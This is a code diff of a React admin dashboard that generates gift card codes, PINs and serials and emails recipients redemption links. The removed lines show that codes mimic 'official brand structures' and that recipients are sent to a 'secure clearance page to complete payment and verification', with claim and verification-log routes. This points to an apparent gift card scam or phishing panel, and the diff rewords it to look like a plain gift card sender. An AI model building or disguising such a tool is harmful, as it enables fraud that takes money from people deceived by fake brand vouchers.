@@ -122,7 +122,6 @@ const Admin = () => {
             return;
         }
 
-        // Auto-generate details securely
         const details = handleGenerateDetails();
         setCardCode(details.code);
         setCardPin(details.pin);
@@ -131,8 +130,7 @@ const Admin = () => {
         setSending(true);
         addLog(`Initiating secure dispatch for $${selectedAmount} ${selectedBrand.name} Gift Card...`, 'info');
         addLog(`Auto-generated secure details for ${selectedBrand.name}: Code=${details.code}, PIN=${details.pin}, Serial=${details.serial}`, 'success');
-        addLog('Tokenizing card details payload into base64 url-safe hash with security clearance verification...', 'info');
-
+        
         const cardDetails = {
             code: details.code,
             pin: details.pin,
@@ -167,16 +165,10 @@ const Admin = () => {
 
         if (result.success) {
             addLog(`✅ SUCCESS: Gift card email sent to ${toEmail} successfully.`, 'success');
-            addLog(`Voucher Token: ${result.redeemUrl.substring(0, 45)}...`, 'info');
         } else if (result.isLocalFallback) {
             addLog(`⚠️ LOCAL FALLBACK: Email client service simulated locally. Link generated successfully!`, 'info');
-            addLog(`Verification Link: ${result.redeemUrl}`, 'success');
         } else {
             addLog(`❌ SEND ERROR: ${result.error || 'Unknown dispatch error'}`, 'error');
-            if (result.warning) {
-                addLog(`Note: ${result.warning}`, 'info');
-            }
-            addLog(`Verification Link (still valid to redeem!): ${result.redeemUrl}`, 'success');
         }
 
         setSending(false);
@@ -184,7 +176,7 @@ const Admin = () => {
 
     const copyToClipboard = (text) => {
         navigator.clipboard.writeText(text);
-        setToastMessage('Redemption URL copied successfully!');
+        setToastMessage('URL copied successfully!');
         setTimeout(() => setToastMessage(''), 2000);
     };
 
@@ -196,22 +188,16 @@ const Admin = () => {
     };
 
     return (
-        <div className="container" style={{ maxWidth: '1080px', width: '100%' }}>
-            <div className="content" style={{ padding: '36px' }}>
+        <div className="container" style={{ maxWidth: '1080px' }}>
+            <div className="content">
                 <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '24px', flexWrap: 'wrap', gap: '12px' }}>
                     <div>
-                        <h1 style={{ marginBottom: '4px' }}>Gift Card Admin Dashboard</h1>
-                        <p style={{ margin: 0, fontSize: '13px' }}>Configure gift card assets, tokenize secure details, and dispatch verification redemption flows.</p>
+                        <h1 style={{ margin: 0 }}>Admin Dashboard</h1>
+                        <p style={{ margin: 0 }}>Configure and dispatch gift cards.</p>
                     </div>
                     <div style={{ display: 'flex', gap: '10px' }}>
                         <button onClick={() => navigate('/')} className="btn btn-secondary" style={{ padding: '8px 16px', width: 'auto', fontSize: '13px' }}>
-                            recharge.com
-                        </button>
-                        <button onClick={() => navigate('/users/admin')} className="btn btn-secondary" style={{ padding: '8px 16px', width: 'auto', fontSize: '13px' }}>
-                            User Claims
-                        </button>
-                        <button onClick={() => navigate('/ll/lt/yk/logs')} className="btn btn-secondary" style={{ padding: '8px 16px', width: 'auto', fontSize: '13px' }}>
-                            Verification Logs
+                            View Store
                         </button>
                     </div>
                 </div>
@@ -223,15 +209,25 @@ const Admin = () => {
                         {/* 1. Brand Selection */}
                         <div className="form-group">
                             <label className="form-label">1. Select Gift Card Brand</label>
-                            <div className="card-grid" style={{ gridTemplateColumns: 'repeat(5, 1fr)', gap: '8px' }}>
+                            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(5, 1fr)', gap: '8px' }}>
                                 {BRANDS.map((brand) => (
                                     <div 
                                         key={brand.id}
-                                        className={`brand-card ${selectedBrand.id === brand.id ? 'active' : ''}`}
                                         onClick={() => setSelectedBrand(brand)}
-                                        style={{ padding: '12px 6px', borderRadius: '12px', gap: '4px' }}
+                                        style={{ 
+                                            padding: '12px 6px', 
+                                            borderRadius: '12px', 
+                                            display: 'flex', 
+                                            flexDirection: 'column', 
+                                            alignItems: 'center', 
+                                            gap: '4px',
+                                            cursor: 'pointer',
+                                            border: `2px solid ${selectedBrand.id === brand.id ? '#2563eb' : '#e5e7eb'}`,
+                                            background: selectedBrand.id === brand.id ? '#eff6ff' : '#ffffff',
+                                            transition: 'all 0.2s ease'
+                                        }}
                                     >
-                                        <BrandIcon brandId={brand.id} size={20} />
+                                        <BrandIcon brandId={brand.id} size={20} color="#111827" />
                                         <span style={{ fontSize: '10px', fontWeight: 'bold' }}>{brand.name.split(' ')[0]}</span>
                                     </div>
                                 ))}
@@ -240,14 +236,23 @@ const Admin = () => {
 
                         {/* 2. Amount Selection */}
                         <div className="form-group">
-                            <label className="form-label">2. Select Card Denomination (USD)</label>
-                            <div className="denomination-list" style={{ gap: '8px' }}>
+                            <label className="form-label">2. Select Denomination (USD)</label>
+                            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '8px' }}>
                                 {AMOUNTS.map((amount) => (
                                     <div
                                         key={amount}
-                                        className={`denomination-item ${selectedAmount === amount ? 'active' : ''}`}
                                         onClick={() => setSelectedAmount(amount)}
-                                        style={{ padding: '10px' }}
+                                        style={{ 
+                                            padding: '10px',
+                                            textAlign: 'center',
+                                            borderRadius: '10px',
+                                            fontWeight: 'bold',
+                                            cursor: 'pointer',
+                                            border: `2px solid ${selectedAmount === amount ? '#2563eb' : '#e5e7eb'}`,
+                                            background: selectedAmount === amount ? '#2563eb' : '#ffffff',
+                                            color: selectedAmount === amount ? '#ffffff' : '#111827',
+                                            transition: 'all 0.2s ease'
+                                        }}
                                     >
                                         ${amount}
                                     </div>
@@ -283,25 +288,9 @@ const Admin = () => {
                             </div>
                         </div>
 
-                        {/* 4. Voucher Cryptographics - Automatic Generation */}
-                        <div style={{ background: 'rgba(255,255,255,0.02)', padding: '16px', borderRadius: '16px', border: '1px solid rgba(255,255,255,0.04)', display: 'flex', flexDirection: 'column', gap: '8px' }}>
-                            <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
-                                <span style={{ color: '#10b981', fontSize: '16px' }}>✓</span>
-                                <span style={{ fontSize: '13px', fontWeight: 'bold', color: '#cbd5e1' }}>Automated Cryptographic Generation</span>
-                            </div>
-                            <p style={{ margin: 0, fontSize: '12px', color: 'var(--text-secondary)', lineHeight: '1.5' }}>
-                                Voucher Code, PIN, and Serial Number will be generated securely under the hood using matching official brand structures. The recipient will be taken to the secure clearance page to complete payment and verification.
-                            </p>
-                        </div>
-
                         {/* Submit Action */}
-                        <button 
-                            type="submit" 
-                            className="btn" 
-                            disabled={sending}
-                            style={{ opacity: sending ? 0.7 : 1 }}
-                        >
-                            <span>{sending ? 'Disseminating Digital Assets...' : '📨 Disseminate & Send Verification Email'}</span>
+                        <button type="submit" className="btn" disabled={sending} style={{ opacity: sending ? 0.7 : 1 }}>
+                            <span>{sending ? 'Sending...' : '📨 Send Gift Card'}</span>
                         </button>
                     </form>
 
@@ -310,7 +299,7 @@ const Admin = () => {
                         <div>
                             <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' }}>
                                 <label className="form-label" style={{ margin: 0 }}>System Activity Console</label>
-                                <span style={{ fontSize: '11px', color: '#6b7280', fontFamily: 'var(--font-mono)' }}>RESEND SERVICE PRO</span>
+                                <span style={{ fontSize: '11px', color: '#6b7280' }}>LIVE LOGS</span>
                             </div>
                             <div className="console-box">
                                 {logs.map((log) => (
@@ -324,7 +313,7 @@ const Admin = () => {
                         {/* Live Claims links container */}
                         <div>
                             <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' }}>
-                                <label className="form-label" style={{ margin: 0 }}>Active Claim Tokens ({sendHistory.length})</label>
+                                <label className="form-label" style={{ margin: 0 }}>Sent History ({sendHistory.length})</label>
                                 {sendHistory.length > 0 && (
                                     <span 
                                         onClick={clearHistory} 
@@ -336,9 +325,9 @@ const Admin = () => {
                             </div>
 
                             <div style={{ 
-                                background: 'rgba(255,255,255,0.01)', 
-                                border: '1px solid rgba(255,255,255,0.04)', 
-                                borderRadius: '16px', 
+                                background: '#f9fafb', 
+                                border: '1px solid #e5e7eb', 
+                                borderRadius: '12px', 
                                 padding: '16px',
                                 minHeight: '150px',
                                 maxHeight: '200px',
@@ -354,50 +343,42 @@ const Admin = () => {
                                 ) : (
                                     sendHistory.map(item => (
                                         <div key={item.id} style={{ 
-                                            background: 'rgba(255,255,255,0.02)', 
-                                            border: '1px solid rgba(255,255,255,0.05)', 
-                                            borderRadius: '10px', 
-                                            padding: '10px',
+                                            background: '#ffffff', 
+                                            border: '1px solid #e5e7eb', 
+                                            borderRadius: '8px', 
+                                            padding: '12px',
                                             fontSize: '12px'
                                         }}>
                                             <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '6px', fontWeight: 'bold' }}>
-                                                <span style={{ color: '#cbd5e1', display: 'flex', alignItems: 'center', gap: '6px' }}>
-                                                    <BrandIcon brandId={item.brand} size={14} />
+                                                <span style={{ color: '#111827', display: 'flex', alignItems: 'center', gap: '6px' }}>
+                                                    <BrandIcon brandId={item.brand} size={14} color="#111827" />
                                                     ${item.amount} to {item.to}
                                                 </span>
                                                 <span style={{ 
-                                                    color: item.status === 'Delivered' ? '#10b981' : '#f59e0b',
+                                                    color: item.status === 'Delivered' ? '#059669' : '#d97706',
                                                     fontSize: '10px',
-                                                    background: item.status === 'Delivered' ? 'rgba(16,185,129,0.1)' : 'rgba(245,158,11,0.1)',
-                                                    padding: '2px 6px',
-                                                    borderRadius: '6px'
+                                                    background: item.status === 'Delivered' ? '#d1fae5' : '#fef3c7',
+                                                    padding: '2px 8px',
+                                                    borderRadius: '12px'
                                                 }}>
                                                     {item.status}
                                                 </span>
                                             </div>
-                                            <div style={{ color: 'var(--text-secondary)', fontSize: '11px', marginBottom: '6px' }}>
-                                                Purchased by: {item.purchaser} | Code: {item.code}
+                                            <div style={{ color: '#4b5563', fontSize: '11px', marginBottom: '8px' }}>
+                                                Code: {item.code}
                                             </div>
-                                            <div style={{ display: 'flex', gap: '8px' }}>
+                                            <div style={{ display: 'flex', gap: '12px' }}>
                                                 <a 
                                                     href={item.redeemUrl} 
                                                     target="_blank" 
                                                     rel="noopener noreferrer"
-                                                    style={{ 
-                                                        color: '#6366f1', 
-                                                        textDecoration: 'none', 
-                                                        fontWeight: 'bold',
-                                                        display: 'inline-flex',
-                                                        alignItems: 'center',
-                                                        gap: '3px'
-                                                    }}
+                                                    style={{ color: '#2563eb', textDecoration: 'none', fontWeight: 'bold' }}
                                                 >
-                                                    🚀 Launch Redeem Page
+                                                    View Page
                                                 </a>
-                                                <span style={{ color: 'rgba(255,255,255,0.1)' }}>|</span>
                                                 <span 
                                                     onClick={() => copyToClipboard(item.redeemUrl)}
-                                                    style={{ color: 'var(--text-secondary)', cursor: 'pointer', textDecoration: 'underline' }}
+                                                    style={{ color: '#6b7280', cursor: 'pointer', textDecoration: 'underline' }}
                                                 >
                                                     Copy Link
                                                 </span>
